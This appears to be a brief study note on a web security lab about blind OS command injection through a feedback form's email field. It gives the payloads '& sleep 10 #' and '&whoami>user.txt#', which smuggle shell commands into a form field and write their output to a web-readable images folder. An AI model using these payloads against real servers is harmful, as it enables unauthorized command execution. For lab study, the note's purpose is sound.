## Blind OS command injection with output redirection.
Vuln: feedback function
    -output is not returned in the response.
    - writable folder at: /var/www/images/
Soln: & sleep 10 #
    -after email -> &whoami>user.txt#
    -in /image folder -> user.txt